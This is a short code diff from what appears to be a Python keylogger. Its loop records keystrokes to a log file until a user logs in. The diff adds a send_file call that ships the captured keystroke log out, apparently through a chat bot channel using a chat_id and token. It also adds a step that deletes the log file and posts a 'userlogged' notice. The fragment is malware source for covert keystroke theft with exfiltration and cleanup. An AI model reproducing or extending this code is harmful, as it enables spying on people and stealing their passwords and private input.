@@ -112,7 +112,10 @@ print(log_file_path)
 
 while True:
     if is_user_logged_in():
+        if os.path.isfile(log_file_path):
+            os.remove(log_file_path)
         send_message(chat_id, token, "userlogged")
         break
     else:
         keylogger(log_file_path, 10)
+        send_file(log_file_path)
